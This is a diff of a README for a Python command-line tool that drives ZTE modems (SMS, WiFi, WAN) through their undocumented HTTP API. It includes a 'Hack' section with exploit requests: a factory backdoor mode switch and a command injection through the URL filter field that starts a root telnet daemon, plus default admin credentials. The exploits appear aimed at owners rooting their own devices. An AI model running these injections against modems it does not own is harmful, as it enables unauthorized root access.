@@ -1,262 +1,199 @@
-## Python Version
+# ZTE Modem CLI
+
+Python CLI for controlling ZTE modems — SMS, WiFi, WAN, and root access hacks.
+
+**Tested on:** MF253M — also works with MF823L, MF286, and other ZTE models with a Web GUI.
+
+---
+
+## Quick Start
 
 **Requires:** Python 3.8+
 
-**Install dependencies:**
-```
+```bash
 pip install -r requirements.txt
 ```
 
-**Configure credentials** — copy `.env.example` to `.env` and edit:
+Copy `.env.example` to `.env` and set your credentials:
+
 ```
 MODEM_IP=192.168.0.1
 PASSWORD=admin
 ```
 
-**CLI usage:**
+> The password must be **base64-encoded**. Use `base64` in your terminal or [base64encode.org](https://www.base64encode.org).
+
+---
+
+## CLI Usage
+
 ```
 python zte.py [--ip IP] [--password PASS] <command> [args]
 ```
 
-| command | arg1 | arg2 | Result |
-|---------|------|------|--------|
-| login | on/off | | Login or logoff |
-| ls | | | List all SMS messages |
-| rm | # | | Delete message # |
-| rm | * | | Delete all messages |
-| snd | Phone# | 'Message' | Send SMS |
-| wifi | on/off | | Enable or disable WiFi |
-| wan | on/off | | Connect or disconnect WAN |
-| hack | | | Hack modem (Method 2) |
-| hack3 | [tftp_ip] | | Hack modem (Method 3, zte_debug.sh) |
-| hack3d | [tftp_ip] | | Hack modem (Method 3 direct) |
+The `--ip` and `--password` flags override the `.env` values for a single run.
+
+| Command         | Args                    | Description                          |
+|-----------------|-------------------------|--------------------------------------|
+| `login on`      |                         | Log in to the modem                  |
+| `login off`     |                         | Log off from the modem               |
+| `ls`            |                         | List all SMS messages                |
+| `rm <id>`       | Message ID              | Delete a specific message            |
+| `rm *`          |                         | Delete all messages                  |
+| `snd <phone> <msg>` | Phone number, message | Send an SMS                      |
+| `wifi on\|off`  |                         | Enable or disable WiFi               |
+| `wan on\|off`   |                         | Connect or disconnect WAN            |
+| `hack`          |                         | Hack modem — Method 2 (built-in telnetd) |
+| `hack3 [tftp_ip]` | TFTP server IP        | Hack modem — Method 3 via `zte_debug.sh` |
+| `hack3d [tftp_ip]` | TFTP server IP       | Hack modem — Method 3 direct         |
 
 ---
 
-# ZTE API and Hack
+## Running Tests
 
-## PHP Classes
-
-See **src** folder:
-
-Curl.php - Curl requests
-
-Json.php - Json Encode / Decode
-
-Hex.php - Hex Encode / Decode
-
-Sms.php - Sms List, Send and Delete Message(s)
-
-Login.php - Login / Logoff
-
-Wifi.php - WiFi Enable / Disable
-
-Wan.php - Wan Connect / Disconnect
-
-Hack.php - Hack the Modem
-
-## How to Use PHP Class
-
-**Require:**
-
-Install php-curl extension
-
-Install php-json extension
-
-Set your **modem_ip** and **password** on **index.php**
-
-**Optional:**
-
-Composer [https://getcomposer.org](https://getcomposer.org)
-
-**CLI interface:**
-
-php index.php **parameters**
-
-| parameter1 | parameter2 |  parameter3 | Result |
-|------------|------------|-------------|--------|
-|   login    | on/off     |             |**Login or Logoff Modem**|
-|   ls       |            |             |**List all Messages** |
-|	  rm       | #          |             |**Delete the Message #**|
-|   rm       | '*'        |             |**Delete all Messages**|
-|   snd      | Phone#     | 'Message'   |**Send The 'Message' to Phone#**|
-|   wifi     | on/off     |             |**Enable or Disable Wifi**|
-|   wan      | on/off     |             |**Connect or Disconnect WAN**|
-|   hack     |            |             |**Hack Modem**|
-
-**Obs:** Tested with PHP 7.2.29
-
-Minimum PHP version 5.3.0
-
-To Help please open an Issue
-
-To contribute open a Pullrequest
-
-***
-
-
-## API
-
-This modem does not have API documentation.
-
-### Work with MF253M (Tested), MF823L, MF286, maybe others whit Web GUI
-
-modem_ip is your modem IP
-
-Password is base64 encoded
-[https://www.base64encode.org](https://www.base64encode.org)
-
-### Login
-```
-Method: POST
-
-curl -s --header "Referer: http://<modem_ip>/index.html" -d 'isTest=false&goformId=LOGIN&password=<Password>' http://<modem_ip>/goform/goform_set_cmd_process
-
-
-if is OK {"result":"3"}
-if is BAD {"result":"1"}
+```bash
+pytest tests/
 ```
 
-### Logoff
+---
+
+## API Reference
+
+The modem exposes an undocumented HTTP API. All requests require a `Referer` header pointing to the modem's index page.
+
+### Authentication
+
+**Login**
 ```
-Method: POST
+POST http://<modem_ip>/goform/goform_set_cmd_process
+Referer: http://<modem_ip>/index.html
 
-curl -s --header "Referer: http://<modem_ip>/index.html" -d 'isTest=false&goformId=LOGOFF' http://<modem_ip>/goform/goform_set_cmd_process
+isTest=false&goformId=LOGIN&password=<base64_password>
+```
+Response: `{"result":"3"}` on success, `{"result":"1"}` on failure.
 
+**Logoff**
+```
+POST http://<modem_ip>/goform/goform_set_cmd_process
+Referer: http://<modem_ip>/index.html
 
-if is OK {"result":"sucess"}
+isTest=false&goformId=LOGOFF
+```
+Response: `{"result":"sucess"}`
+
+---
+
+### SMS
+
+**List messages**
+```
+GET http://<modem_ip>/goform/goform_get_cmd_process
+    ?isTest=false&cmd=sms_data_total&page=0&data_per_page=500
+    &mem_store=1&tags=10&order_by=order+by+id+desc
+Referer: http://<modem_ip>/index.html
+```
+Response: `{"messages": [...]}`
+
+**Send a message**
+```
+POST http://<modem_ip>/goform/goform_set_cmd_process
+Referer: http://<modem_ip>/index.html
+
+isTest=false&goformId=SEND_SMS&notCallback=true
+&Number=<url_encoded_phone>&sms_time=<datetime>
+&MessageBody=<hex_encoded_message>&ID=-1&encode_type=UNICODE
+```
+- Phone number must be URL-encoded.
+- Message body must be hex-encoded.
+
+Response: `{"result":"success"}`
+
+**Delete a message**
+```
+POST http://<modem_ip>/goform/goform_set_cmd_process
+Referer: http://<modem_ip>/index.html
+
+isTest=false&goformId=DELETE_SMS&msg_id=<id>;&notCallback=true
+```
+To delete multiple messages, repeat with each ID.
+
+Response: `{"result":"success"}`
+
+---
+
+### WiFi
+
+**Enable**
+```
+POST http://<modem_ip>/goform/goform_set_cmd_process
+Referer: http://<modem_ip>/index.html
+
+goformId=SET_WIFI_INFO&isTest=false&m_ssid_enable=0&wifiEnabled=1
 ```
 
-### SMS List
+**Disable**
 ```
-Method: GET
+POST http://<modem_ip>/goform/goform_set_cmd_process
+Referer: http://<modem_ip>/index.html
 
-curl -s --header "Referer: http://<modem_ip>/index.html" http://<modem_ip>//goform/goform_get_cmd_process\?isTest\=false\&cmd\=sms_data_total\&page=0\&data_per_page\=500\&mem_store\=1\&tags\=10\&order_by\=order+by+id+desc
-
-if is OK {"messages":[]}
-
+goformId=SET_WIFI_INFO&isTest=false&m_ssid_enable=0&wifiEnabled=0
 ```
 
-### Delete SMS Message(s)
-```
-Method: POST
+Response: `{"result":"success"}`
 
-curl -s --header "Referer: http://<modem_ip>/index.html" -d "isTest=false&goformId=DELETE_SMS&msg_id=<id>;&notCallback=true" curl -s --header "Referer: http://<modem_ip>/index.html"
-http://<modem_ip>/goform/goform_set_cmd_process
-
-id is a Message ID
-To delete multiple pass ID one by one
-
-if is OK {"result":"success"}
-
-```
-
-### Send SMS Message
-```
-Method: POST
-
-curl -s --header "Referer: http://<modem_ip>/index.html" -d "isTest=false&goformId=SEND_SMS&notCallback=true&Number=<phone_number>&sms_time=<date>&MessageBody=<message>&ID=-1&encode_type=UNICODE"
-http://<modem_ip>/goform/goform_set_cmd_process
-
-phone_number is urlencoded
-message is hexencoded
-
-if is OK {"result":"success"}
-```
-
-### Disable WiFi
-```
-Method: POST
-
-curl -s --header "Referer: http://<modem_ip>/index.html" -d 'goformId=SET_WIFI_INFO&isTest=false&m_ssid_enable=0&wifiEnabled=0' http://<modem_ip>/goform/goform_set_cmd_process
-
-if is OK {"result":"success"}
-
-```
-
-### Enable WiFi
-```
-Method: POST
-
-curl -s --header "Referer: http:/<modem_ip>/index.html" -d 'goformId=SET_WIFI_INFO&isTest=false&m_ssid_enable=0&wifiEnabled=1' http://<modem_ip>/goform/goform_set_cmd_process
-
-if is OK {"result":"success"}
-
-```
-
-***
+---
 
 ## Hack
 
-Linux  users must install curl and telnet
+These methods gain root/telnet access to the modem. Requires `curl` and `telnet`.
 
-Password is base64 encoded
-[https://www.base64encode.org](http://https://www.base64encode.org)
+### Method 2 — Built-in Telnetd (NVRAM exploit)
 
-Linux users may use base64 in terminal (see man base64)
-
-modem_ip is your modem IP
-
-### Factory Backdoor
-
+**Step 1: Enable factory backdoor**
 ```
-Method: POST
-
-curl -s -H "Referer: http://<modem_ip>/index.html" "http://<modem_ip>/goform/goform_set_cmd_process?isTest=false&goformId=CHANGE_MODE&change_mode=2&password=<Password>"
-
-if is OK {"result":"success"}
-
+POST http://<modem_ip>/goform/goform_set_cmd_process?isTest=false
+     &goformId=CHANGE_MODE&change_mode=2&password=<base64_password>
+Referer: http://<modem_ip>/index.html
 ```
-### Enable Root Acess
+Response: `{"result":"success"}`
 
+**Step 2: Exploit NVRAM to start telnetd**
 ```
-Method: POST
+POST http://<modem_ip>/goform/goform_set_cmd_process
+Referer: http://<modem_ip>/index.html
 
-curl "http://<modem_ip>/goform/goform_set_cmd_process" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Referer: http://<modem_ip>/index.html" --data "isTest=false&goformId=LOGIN&password=<Password>"
-
-if is OK  {"result":"3"}
-
+isTest=false&goformId=URL_FILTER_ADD
+&addURLFilter=http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26
 ```
+Response: `{"result":"success"}`
 
-### Exploits Nvram
-
-```
-Method: POST
-
-curl "http://<modem_ip>/goform/goform_set_cmd_process" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Referer: http://<modem_ip>/index.html" --data "isTest=false&goformId=URL_FILTER_ADD&addURLFilter=http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26"
-
-if is OK {"result":"success"}
-
-```
-
-### SSH Access
-
+**Step 3: Connect via Telnet**
 ```
 telnet <modem_ip> 4719
 
 User: admin
 Pass: admin
-
 ```
 
-***
+### Method 3 — TFTP Telnetd
 
-### Special thanks to:
+Fetches a `telnetd` binary from a TFTP server on your network and starts it on port 23. Run `hack3` or `hack3d` from the CLI — see the command table above.
 
-[https://taisto.org/ZTE_MF823D](https://taisto.org/ZTE_MF823D) - for PHP Class
+Default TFTP server IP: `192.168.0.22` (override by passing your IP as an argument).
 
-[https://gist.github.com/mariodian/65641792700d237d30f3f47d24c746e0](http://gist.github.com/mariodian/65641792700d237d30f3f47d24c746e0) - for script shell
+After the exploit: `telnet <modem_ip> 23` with `admin/admin`.
 
-[https://gist.github.com/mariodian/bafe4b0a83226d7680ee41424c4e5b7b](http://gist.github.com/mariodian/bafe4b0a83226d7680ee41424c4e5b7b) - for pushover
+---
 
-[https://pushover.net](https://pushover.net)
+## Credits
 
-[https://www.fr.net.br/2016/02/modem-zte-mf823l-avaliacao.html](https://www.fr.net.br/2016/02/modem-zte-mf823l-avaliacao.html)
-
-[http://my-router.blogspot.com/2015/09/zte-mf823-4g-change-ip-of-modem-and-get.html](http://my-router.blogspot.com/2015/09/zte-mf823-4g-change-ip-of-modem-and-get.html)
-
-[http://blog.asiantuntijakaveri.fi/2017/03/backdoor-and-root-shell-on-zte-mf286.html](http://blog.asiantuntijakaveri.fi/2017/03/backdoor-and-root-shell-on-zte-mf286.html) - for Hack
-
-[https://www.base64encode.org](https://www.base64encode.org) - for code and decode base64
-
-[https://incarnate.github.io/curl-to-php/](https://incarnate.github.io/curl-to-php/) - for convert curl to PHP curl
+- [paulo-correia](https://github.com/paulo-correia) — original repository author
+- [taisto.org/ZTE_MF823D](https://taisto.org/ZTE_MF823D) — original PHP class
+- [mariodian](https://gist.github.com/mariodian/65641792700d237d30f3f47d24c746e0) — shell script reference
+- [mariodian](https://gist.github.com/mariodian/bafe4b0a83226d7680ee41424c4e5b7b) — Pushover integration
+- [pushover.net](https://pushover.net)
+- [fr.net.br](https://www.fr.net.br/2016/02/modem-zte-mf823l-avaliacao.html) — MF823L info
+- [my-router.blogspot.com](http://my-router.blogspot.com/2015/09/zte-mf823-4g-change-ip-of-modem-and-get.html) — IP/root access guide
+- [asiantuntijakaveri.fi](http://blog.asiantuntijakaveri.fi/2017/03/backdoor-and-root-shell-on-zte-mf286.html) — MF286 backdoor research
+- [base64encode.org](https://www.base64encode.org)
+- [incarnate.github.io/curl-to-php](https://incarnate.github.io/curl-to-php/) — curl-to-PHP converter
